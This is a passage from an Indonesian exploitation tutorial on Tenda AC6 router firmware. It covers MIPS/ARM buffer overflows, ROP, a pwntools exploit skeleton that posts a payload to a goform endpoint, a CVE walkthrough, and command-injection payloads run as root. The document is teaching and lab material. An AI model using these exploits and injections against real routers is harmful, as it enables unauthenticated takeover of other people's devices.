        <w:t>Return address ada di **$ra**; prolog fungsi menyimpannya ke stack (`sw $ra, ...($sp)`), epilog me-load kembali (`lw $ra; jr $ra`). Kita menimpa salinan di stack itu.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Delay slot:** instruksi setelah `jr $ra` ikut dieksekusi. Susun payload agar delay slot tidak merusak kontrol.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Endianness: RTL8197F (firmware kita) = **little-endian**, jadi alamat ditulis `p32(addr)` (LE).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Null byte:** banyak alamat MIPS mengandung byte 0x00 (mis. 0x00401234). Jika input via string HTTP, byte NUL memotong payload -&gt; perlu trik (alamat tanpa NUL, atau encoding).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Izinkan **cache coherency**: shellcode di stack mungkin butuh flush cache (qemu/gdb bisa berbeda dari hardware asli).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># sketsa payload MIPS (pseudocode):</w:t>
        <w:br/>
        <w:t>payload  = b'A'*OFFSET     # isi buffer sampai menyentuh saved $ra</w:t>
        <w:br/>
        <w:t>payload += p32(ALAMAT)      # timpa $ra -&gt; lompat ke fungsi/gadget</w:t>
        <w:br/>
        <w:t>payload += b'NOP'*...       # delay slot / sled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>14.1 Dari crash ke kontrol</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Kirim payload 'A'*N, catat di nilai berapa register/PC berubah (via gdb/qemu) = cari OFFSET dengan pola siklik.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ganti 4 byte terakhir dengan alamat uji (mis. 0x41414141) -&gt; pastikan PC menjadi 0x41414141.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Arahkan ke fungsi menarik: `system("/bin/sh")`, atau ROP chain, atau shellcode.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>15. Eksploitasi ARM: seluk-beluk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Return address di **LR** (r14); prolog menyimpannya (`push {..., lr}`), epilog `pop {..., pc}` -&gt; timpa saved LR yang nanti jadi PC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Mode **Thumb**: alamat gadget ganjil (bit0=1) menandakan Thumb; hati-hati alignment.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Argumen r0-r3; siapkan r0 = pointer string sebelum memanggil system (via ROP).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sama seperti MIPS: cari offset -&gt; kendalikan PC -&gt; ret2libc/ROP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>16. Mitigasi Modern &amp; Kenyataan di Embedded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Mitigasi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Fungsi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Cara cek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Kenyataan di router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Stack canary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deteksi overwrite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readelf -s | grep stack_chk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sering TIDAK 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NX/DEP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stack tidak executable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readelf -l (GNU_STACK RWE?)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sering NX OFF -&gt; shellcode boleh di stack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ASLR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acak alamat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/proc/sys/kernel/randomize_va_space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sering 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randomasi base binary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readelf -h (Type: EXEC vs DYN)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sering EXEC (base tetap)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lindungi GOT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readelf -l | grep GNU_RELRO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sering partial/none</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Pelajaran:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> di embedded, sebagian besar proteksi OFF → stack overflow langsung ke RCE (bukan cuma DoS). Inilah yang membuat CVE buffer overflow router sangat berbahaya.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>17. Teknik Kontrol Eksekusi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>17.1 Shellcode di stack (jika NX off)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Tempatkan kode (mis. execve("/bin/sh")) di buffer, lalu arahkan $ra/pc ke alamat buffer. Kendala: butuh alamat stack, dan masalah cache/NUL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>17.2 ret2libc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Lompat ke `system()` di libc (atau fungsi yang sudah ada di binary), dengan argumen `/bin/sh` (cari string di libc/binary). Tidak perlu shellcode sendiri.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>17.3 ROP (Return-Oriented Programming)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Rangkai 'gadget' (potongan instruksi diakhiri `jr $ra`/`bx lr`) untuk menyusun operasi. Diperlukan saat NX aktif. Untuk MIPS/ARM, gadget &amp; cara transisi register sedikit berbeda.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Cari gadget dengan ropper/Ropper:</w:t>
        <w:br/>
        <w:t># ropper --file httpd --search "addiu $a0"</w:t>
        <w:br/>
        <w:t># ROPgadget --binary httpd --only "jr|jalr"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>17.4 ret2syscall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Jika fungsi libc tidak cocok, siapkan register sesuai ABI syscall MIPS/ARM lalu `syscall` untuk execve. Perlu gadget pengatur register.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>18. Menulis Exploit dengan pwntools</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>pwntools menyediakan `p32/p64`, `cyclic`, dan koneksi. Kerangka umum (untuk lab/emulasi Anda):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>from pwn import *</w:t>
        <w:br/>
        <w:t>context.update(arch='mips', os='linux', endian='little', bits=32)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 1) cari offset dengan pola siklik</w:t>
        <w:br/>
        <w:t>#    kirim cyclic(2000), lihat nilai $ra saat crash -&gt; cyclic_find(nilai)</w:t>
        <w:br/>
        <w:t>OFFSET = 0x44            # contoh (harus ditemukan sendiri)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2) alamat target (harus dicari di binary/libc Anda, mis. via Ghidra/ropgadget)</w:t>
        <w:br/>
        <w:t>SYSTEM = 0x0040a120      # contoh: alamat system()</w:t>
        <w:br/>
        <w:t>BINSH  = 0x00410010      # contoh: alamat string "/bin/sh"</w:t>
        <w:br/>
        <w:br/>
        <w:t>payload  = b'A'*OFFSET</w:t>
        <w:br/>
        <w:t>payload += p32(SYSTEM)   # timpa $ra</w:t>
        <w:br/>
        <w:t>payload += b'BBBB'       # (perhatikan delay slot / argumen)</w:t>
        <w:br/>
        <w:t>payload += p32(BINSH)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3) kirim ke endpoint web yang rentan</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:t>requests.post('http://127.0.0.1:80/goform/SetXxx', data={'param': payload})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Angka di atas hanya contoh. Menguji pada perangkat asli bisa menyebabkan crash/reboot. Latih di qemu/FirmAE sampai paham, baru pertimbangkan perangkat fisik milik sendiri.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>18.1 Bad characters &amp; encoding HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Byte NUL (0x00) sering memotong string di parser C.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Karakter khusus URL harus di-encode (`%00`, `%0a`, dll) — tetapi encoding bisa mengubah makna payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kadang perlu menghindari '&amp;', '=', spasi di body form.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>19. Emulasi &amp; Debug Exploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>qemu-mipsel + gdb-multiarch: jalankan &amp; hentikan di titik rawan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FirmAE: boot seluruh firmware, uji eksploit lewat jaringan emulasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Instrumentasi: patch binary untuk mematikan fork/canary agar mudah di-debug (di emulasi saja).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># contoh cepat:</w:t>
        <w:br/>
        <w:t>qemu-mipsel -L rootfs -g 1234 rootfs/bin/httpd</w:t>
        <w:br/>
        <w:t>gdb-multiarch -q -ex 'set arch mips' -ex 'target remote :1234' rootfs/bin/httpd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>20. Studi Kasus: CVE Tenda</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Mari rangkai seluruh alur pada fungsi nyata yang dipakai CVE:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Buka httpd di Ghidra; cari string `formSetPPTPServer` (CVE-2024-51116).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ikuti XREF ke fungsi handler; lihat pseudo-C: cari penyalinan parameter ke buffer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tentukan ukuran buffer; dari asm, hitung jarak ke `sw $ra`/`lw $ra`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Kirim string panjang ke endpoint terkait (via sesi yang sudah login) -&gt; amati crash.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Naikkan ke kontrol PC: cari alamat `system`/gadget; susun payload; uji di emulasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Keluarga CVE lain (`setaccount` /cloudv2, `SetSpeedWan`, `fast_setting_wifi_set`, `addressNat`) mengikuti pola sama: parameter → buffer → tanpa cek → boom.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>PRAKTIK &amp; PENUTUP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>21. Lab Bertahap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>21.1 Dapatkan rootfs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Lihat Volume 1 Bab 15 &amp; Bab 22 di buku ini untuk ekstraksi. Jika httpd standar, `unsquashfs` cukup; jika kustom (seperti firmware ini), lihat Bab 22.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>21.2 Siapkan emulasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>sudo apt install qemu-user qemu-user-static gdb-multiarch python3-pip</w:t>
        <w:br/>
        <w:t>pip install pwntools capstone ropper</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>21.3 Mulai dari yang mudah</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Jalankan `httpd` di qemu; pastikan bisa diakses HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ulangi auth bypass (Volume 1) di emulasi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Cari fungsi ping/diagnostik; uji command injection dengan payload jinak (`;id`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Baru masuk buffer overflow: cari offset, kendalikan PC, arahkan ke `system`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>22. Catatan Nyata: Membongkar SquashFS Kustom Tenda</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Ini pelajaran RE yang </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sangat berharga</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: firmware AC6 v2 Realtek milik Anda </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tidak bisa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> diekstrak dengan `unsquashfs` biasa (gagal `xz` / `LZMA_FORMAT_ERROR`).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>22.1 Hasi binwalk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>2621504  0x280040  Squashfs filesystem, little endian, v4.0,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                   compression:xz, 845 inodes, blocksize 131072</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>22.2 Supeblock jujur, data tidak standar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Superblock valid (compression=xz), tetapi tiap blok metadata diawali penanda khas:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>f0 01 | 54 65 6e 64 61 00 00 01 | fd 69 95 c6 03 c0 ...</w:t>
        <w:br/>
        <w:t>size  | "T e n d a \0 \0 \1"   | data terkompresi (bukan xz standar)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 144 blok memiliki penanda 'Tenda\0\0\1'</w:t>
        <w:br/>
        <w:t># TIDAK ada satu pun magic xz (fd 37 7a 58 5a 00) di seluruh image</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>22.3 Pelajaran</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Vendor sering **memodifikasi format** untuk menghambat analisis / branding.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Tool umum (unsquashfs, 7z, sasquatch standar) bisa gagal → pahami formatnya, atau pakai/program tool khusus.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ini justru latihan RE tingkat lanjut: membandingkan blok, menebak header, mencoba beberapa decompressor (LZMA/LZMA2/raw).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kernel dan struktur firmware tetap bisa dianalisis (kita berhasil meng-disassembly MIPS asli).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Langkah lanjutan yang benar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cari tool ekstraksi khusus Tenda/Realtek, atau tulis extractor sendiri setelah memahami header kustom (bandingkan blok satu-per-satu). Inilah keterampilan RE sejati: tidak berhenti saat tool gagal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>23. Cheat Sheet RE &amp; Exploitasi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Tujuan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Perintah / Langkah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Cek arsitektur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bin; readelf -h bin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Disassemble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objdump -d bin | r2 -A bin; Ghidra (decompile)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Cari string &amp;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strings -n 6 bin | grep -i goform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Cari fungsi CVE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Ghidra: cari nama fungsi/string -&gt; XREF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Cari pemanggil system/popen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Ghidra XREF ke system/popen -&gt; periksa format string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Cari gadget ROP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ropper --file bin; ROPgadget --binary bin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Hitung offset overflow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cyclic(2000) -&gt; cyclic_find($ra/nilai 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Jalankan MIPS di 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qemu-mipsel -L rootfs ./bin/httpd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qemu-mipsel -g 1234 ... + gdb-multiarch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Tulis eksploit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pwntools (p32, cyclic, remote/http)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Disasm dari Python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capstone: Cs(CS_ARCH_MIPS, CS_MODE_MIPS32+CS_MODE_LITTLE_ENDIAN)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>24. Glosarium &amp; Referensi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Istilah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Arti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Membaca binary tanpa menjalankan (Ghidra).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Dynamic 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Menjalankan &amp; mengamati (gdb/strace/qemu).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Referensi silang: siapa memakai string/fungsi.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Potongan instruksi yang diakhiri jmp/jr (untuk ROP).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Shellcode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Kode mesin kecil (mis. spawn shell) yang disuntikkan.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ret2libc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Melompat ke fungsi library (system) alih-alih shellcode.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Merangkai gadget untuk komputasi saat NX aktif.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Delay slot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Instruksi MIPS setelah cabang yang selalu dieksekusi.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mipsel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MIPS little-endian (arsitektur perangkat kita).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Referensi belajar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ghidra documentation &amp; 'Ghidra for reverse engineering' (YouTube: stacksmashing).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>pwntools docs; ROP Emporium (latihan ROP bertingkat).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>'MIPS Assembly' &amp; exploit-db untuk contoh MIPS/ARM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FirmAE / Firmadyne untuk emulasi firmware.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Blog riset: Boschko Security (reverse Tenda/QCA), FirmRec IoT-Vulns.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Dibuat untuk pembelajaran pribadi pada perangkat milik sendiri. Eksploitasi hanya di lab/emulasi.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III</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0B3D91"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>RCE &amp; Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Bagian ini merangkum </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Remote Code Execution (RCE)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> dan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>privilege escalation/root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> pada studi kasus, dengan bukti dari reverse engineering httpd asli (Ghidra) dan konfigurasi firmware.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Ringkasan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Kelas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Vektor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Hasil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RCE (command injection)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Param HTTP -&gt; doSystemCmd/system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Perintah shell sebagai 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RCE (buffer overflow)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Handler formSet* (stack overflow)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Kontrol $ra/PC → eksekusi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Backdoor on-demand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/goform/telnet -&gt; telnetd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Aktifkan telnet jarak jauh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Root/privesc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Akun UID 0 + telnetd + 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Shell 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3"/>
      </w:pPr>
      <w:r>
        <w:t>2. RCE #1 — Command Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Beberapa handler HTTP membaca parameter lalu menyusun </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>perintah shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>. Bila parameter tidak disanitasi, karakter `;` `|` `$()` ``` ` ``` menyisipkan perintah tambahan.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77442"/>
            <wp:docPr id="2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42_rce_templ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7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16. Template shell + aliran parameter ke doSystemCmd (formSetClientState/formSetSpeedWan).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6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07a_formSetClientSt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17. Ghidra (live): formSetClientState() — parameter HTTP diproses di fungsi ini.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7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07b_formSetSpeed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18. Ghidra (live): formSetSpeedWan() — memanggil doSystemCmd().</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// Ringkas (hasil decompile):</w:t>
        <w:br/>
        <w:t>local_20 = get_parameter(p, "deviceId");       // dari HTTP</w:t>
        <w:br/>
        <w:t>local_14 = get_parameter(p, "limitSpeed");     // dari HTTP</w:t>
        <w:br/>
        <w:t>sprintf(buf+0x20, fmt, iVar2, local_20, local_1c, local_18);</w:t>
        <w:br/>
        <w:t>doSystemCmd("...", 0xf, 6);                    // jalankan shell</w:t>
        <w:br/>
        <w:br/>
        <w:t>// formSetSpeedWan: param -&gt; doSystemCmd("ifconfig %s %s", ...)</w:t>
        <w:br/>
        <w:br/>
        <w:t># Contoh payload (uji di lab/emulasi):</w:t>
        <w:br/>
        <w:t>#   deviceId = 192.168.0.1;id</w:t>
        <w:br/>
        <w:t>#   deviceId = 192.168.0.1|id</w:t>
        <w:br/>
        <w:t>#   deviceId = $(id)</w:t>
        <w:br/>
        <w:t># Hasil: 'id' dieksekusi sebagai ROOT (httpd berjalan sebagai root).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Karena ada **auth bypass** (akun `user:user`), vektor ini menjadi **unauthenticated RCE**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Kelas CVE terkait: CVE-2020-10987 (AC15/AC6/AC18) dan keluarga command injection Tenda lain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. RCE #2 — Buffer Overflow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
